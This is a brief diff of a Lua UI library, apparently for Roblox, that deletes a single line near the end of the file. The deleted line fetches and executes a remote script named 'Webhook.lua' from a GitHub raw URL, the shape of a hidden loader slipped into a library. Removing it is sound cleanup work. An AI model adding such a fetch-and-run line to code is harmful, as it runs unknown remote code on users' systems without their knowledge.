@@ -1877,5 +1877,4 @@ function redzlib:MakeWindow(Configs)
 	MinimizeButton.Activated:Connect(Window.MinimizeBtn)
 	return Window
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/realgengar/Brookhaven/refs/heads/main/Webhook.lua"))()
 return redzlib
